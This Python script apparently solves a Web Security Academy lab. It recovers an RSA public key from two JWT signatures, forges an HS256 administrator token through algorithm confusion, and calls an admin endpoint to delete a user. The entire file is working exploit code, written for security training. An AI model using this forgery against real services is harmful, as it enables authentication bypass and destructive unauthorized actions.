from web_security_academy.core.logger import logger

from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from Cryptodome.Signature import pkcs1_15
from Cryptodome.Hash import SHA256
from gmpy2 import gcd, mpz
import jwt

import base64
import re


def solve_lab(session):
    jwts = []

    # Note: This POC will not always extract the correct public key from the
    # JWTs. Increasing num_jwts will increase your chances of extracting
    # the correct public key, but will also make the POC take longer

    num_jwts = 2
    for i in range(num_jwts):
        session.login("wiener", "peter")
        jwts.append(session.cookies.get("session"))
        logger.info(f"Extracted JWT #{i+1}")

    logger.info("Extracting public key from JWTs...")
    public_key = extract_public_key(jwts)
    pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    print("\n" + pem.decode())

    # Allows asymmetric key to be used as an HMAC secret
    jwt.utils._PEM_RE = re.compile(b"^$")

    payload = {"sub": "administrator"}
    token = jwt.encode(payload, pem, algorithm="HS256")
    session.cookies.set("session", token)
    logger.info("Set the session cookie as a signed JWT of the following JSON:")
    logger.info(payload)

    session.get_path("/admin/delete?username=carlos")
    logger.info('Deleted user "carlos"')


# Inspired by https://github.com/silentsignal/rsa_sign2n
def extract_public_key(jwts):
    s = []
    for token in jwts:
        signature = token.split(".")[2]
        signature += "=" * (len(signature) % 4)
        signature = base64.urlsafe_b64decode(signature)

        num_bytes = len(signature)
        signature = int.from_bytes(signature)
        s.append(signature)

    m = []
    for token in jwts:
        header_payload = ".".join(token.split(".")[0:2])
        hsh = SHA256.new(header_payload.encode())
        padded = pkcs1_15._EMSA_PKCS1_V1_5_ENCODE(hsh, num_bytes)
        message = int.from_bytes(padded)
        m.append(message)

    e = 65537
    div = []
    for i, _ in enumerate(jwts):
        dividend = pow(mpz(s[i]), mpz(e)) - mpz(m[i])
        div.append(dividend)

    n = gcd(*div)
    return rsa.RSAPublicNumbers(int(e), int(n)).public_key()
